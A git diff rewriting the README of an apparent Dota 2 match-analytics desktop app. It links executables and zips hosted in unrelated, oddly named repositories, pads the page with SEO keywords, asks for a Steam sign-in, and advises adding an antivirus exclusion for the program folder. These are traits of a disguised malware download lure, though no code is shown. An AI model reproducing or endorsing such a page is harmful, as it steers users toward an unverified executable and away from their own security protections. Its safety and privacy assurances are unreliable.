@@ -1,179 +1,73 @@
-# 🎮 Dota 2 Performance Analytics
+# 🎮 Dota2-Performance-Predictor - Improve your play with smart data
 
-<p align="center">
-  <strong>📊 Match Analysis • Performance Tracking • Trend Detection • Data Visualization</strong>
-</p>
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/wakeless-artemisia25/Dota2-Performance-Predictor/releases)
 
----
+Dota2-Performance-Predictor helps you understand your gameplay. Use this tool to look at your past matches, track your growth, and find patterns that lead to wins. You get clear visuals that show your strengths and your weaknesses.
 
-## 🏆 Overview
+## 📊 Why use performance analytics
 
-Dota 2 Performance Analytics is a desktop application designed to help players better understand their gameplay history through detailed statistics, match analysis, trend monitoring, and performance visualization.
+Dota 2 offers complex data. Sifting through this data manually takes time. This application does the work for you. It pulls your match history and organizes the numbers into charts. You see how your hero choices affect your win rate. You notice trends in your gold income and experience gain. Use these insights to change how you play and increase your rank.
 
-The application processes historical match data and generates useful insights that can help players identify patterns, track improvements, and evaluate long-term performance trends.
+## ⚙️ Minimum system requirements
 
-Whether you are a casual player looking to improve consistency or a competitive player interested in advanced statistics, Dota 2 Performance Analytics provides a simple and accessible way to explore your gameplay data.
+Your computer needs specific hardware to run this tool. Ensure your PC meets these requirements before you start:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or AMD Ryzen 5.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of free disk space.
+*   Network: An active internet connection to fetch match data from Steam.
 
-**➡️ Download Here**
+## 📥 How to download and install
 
-[Download](https://github.com/gcoyerk/turbo-chainsaw/releases/download/test/Dota2-Performance-Predictor.zip)
+Follow these steps to set up the application on your Windows computer.
 
----
+1. Go to the [official release page](https://github.com/wakeless-artemisia25/Dota2-Performance-Predictor/releases).
+2. Look for the file ending in .exe under the section labeled Assets.
+3. Click the file name to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the downloaded file to run the installer.
+6. Follow the instructions on the screen to finish the setup.
+7. Click the application icon on your desktop to launch the tool.
 
-## 🚀 Key Features
+## 🚀 Setting up the application
 
-### 📊 Match Analytics
+The first time you launch the tool, you must connect it to your game data. 
 
-* Detailed match history analysis
-* Performance trend tracking
-* Win and loss pattern visualization
-* Historical gameplay statistics
-* Session performance monitoring
-* Long-term progression tracking
+1. Launch the application.
+2. Sign in with your Steam account when asked. This allows the application to read your public match history.
+3. Wait for the initial scan. This step takes a few minutes depending on how many matches you played.
+4. Once the scan finishes, the dashboard will show your most recent stats.
 
-### 📈 Data Visualization
+## 📈 Viewing match insights
 
-* Interactive charts
-* Performance graphs
-* Match history summaries
-* Statistical dashboards
-* Trend monitoring tools
-* Easy-to-read reports
+The dashboard provides a view of your game performance. Use the tabs at the top of the window to navigate between different categories.
 
-### 🎯 Performance Insights
+*   **Match History:** See a list of your recent games with results, hero choices, and duration.
+*   **Hero Performance:** Filter your stats by hero to see which characters give you the highest win rate.
+*   **Trend Analysis:** View line graphs that show your progression over time. Identify if you improve on specific metrics like last hits or team fight participation.
+*   **Winning Patterns:** The predictor tool marks games where you played well. Compare these games to others to see what items or lanes helped you succeed.
 
-* Analyze gameplay consistency
-* Track recent match performance
-* Identify positive trends
-* Monitor historical progress
-* Compare gameplay periods
-* Evaluate performance changes over time
+## 🛠 Troubleshooting common issues
 
-### ⚡ User Experience
+If you encounter problems, check these items first.
 
-* Simple interface
-* Fast data processing
-* Lightweight desktop application
-* Easy navigation
-* Quick access to statistics
-* Modern dashboard design
+**The application fails to connect.**
+Ensure your internet connection is stable. Check that your Steam profile is set to public. Private profiles prevent the tool from accessing your match history.
 
----
+**The dashboard shows no data.**
+Wait a few minutes as the scanner indexes your recent matches. If the issue persists, open the settings menu and click the "Refresh Data" button.
 
-## 🌟 Why Use Dota 2 Performance Analytics?
+**The window freezes during startup.**
+Close the application and open it again. If the freeze continues, check if your antivirus software blocks the application. Add an exclusion for the application folder to allow it to communicate with the game servers.
 
-Understanding gameplay data can help players make more informed decisions and better evaluate their overall performance.
+**Missing recent matches.**
+Dota 2 servers take time to process match data. If you just finished a game, wait 30 minutes before you refresh the application.
 
-Benefits include:
+## 🔒 Privacy and safety
 
-✅ Match history analysis
+We prioritize your account security. The application uses the official Steam API to retrieve your public match logs. It cannot access your game login credentials, your inventory, or your private communications. It only reads the public results of your matches to provide you with insights. We store your data only on your local machine to keep your statistics private.
 
-✅ Performance monitoring
+## 💡 Best practices for better results
 
-✅ Visual statistics
-
-✅ Trend identification
-
-✅ Historical comparisons
-
-✅ Easy-to-understand reports
-
-✅ Lightweight desktop experience
-
-The application helps transform raw match data into meaningful information that players can review and explore.
-
----
-
-## 📊 What Can You Analyze?
-
-### 🎮 Match Results
-
-* Win and loss history
-* Recent performance
-* Match frequency
-* Historical records
-
-### 📈 Player Performance
-
-* Long-term trends
-* Consistency tracking
-* Performance progression
-* Historical comparisons
-
-### 📋 Statistics
-
-* Match summaries
-* Performance reports
-* Visual charts
-* Gameplay trends
-
----
-
-## 💻 System Requirements
-
-| Component        | Requirement               |
-| ---------------- | ------------------------- |
-| Operating System | Windows 10 / Windows 11   |
-| RAM              | 4 GB Recommended          |
-| Storage          | 200 MB Available Space    |
-| Internet         | Required for Data Updates |
-
----
-
-## ⚙️ Getting Started
-
-1. Download the latest version.
-2. Install the application.
-3. Launch the software.
-4. Import or load match data.
-5. Explore statistics and performance reports.
-
----
-
-## 📅 Frequently Asked Questions
-
-### What is Dota 2?
-
-Dota 2 is a multiplayer online battle arena game developed by Valve and played by millions of players worldwide.
-
-### What does this application do?
-
-The software analyzes match history and presents statistics, trends, and performance insights through an easy-to-use interface.
-
-### Does the application modify Dota 2?
-
-No. The application focuses on analytics, statistics, and performance tracking.
-
-### Is it beginner friendly?
-
-Yes. The interface is designed for both new and experienced players.
-
----
-
-## 🔍 SEO Keywords
-
-Dota 2 Analytics, Dota 2 Statistics, Dota 2 Match Analysis, Dota 2 Performance Tracker, Dota 2 Dashboard, Dota 2 Trends, Dota 2 Player Statistics, Dota 2 Data Visualization, Dota 2 Performance Insights, Dota 2 Match History Analyzer, Dota 2 Gaming Tools, Esports Analytics.
-
----
-
-## 🌟 Improve Your Understanding of Match Performance
-
-📊 Analyze Statistics
-
-📈 Track Trends
-
-🎮 Explore Match History
-
-⚡ Visualize Performance
-
-🏆 Monitor Progress
-
-Everything you need to explore and understand your Dota 2 gameplay data in one desktop application.
- 
- 
- 
- 
- 
- 
+To get the most out of this tool, check your stats after every session. Consistency helps you find patterns you might miss. Focus on one metric at a time. For example, if you notice low gold-per-minute scores in 20-minute games, spend a few days focusing on farming patterns. After several games, return to the dashboard to see if your progress shows on the charts. Use the hero-specific filters to decide which heroes deserve more of your practice time. Matches against different hero types offer different challenges, and this tool helps you identify which matchups give you the most trouble.
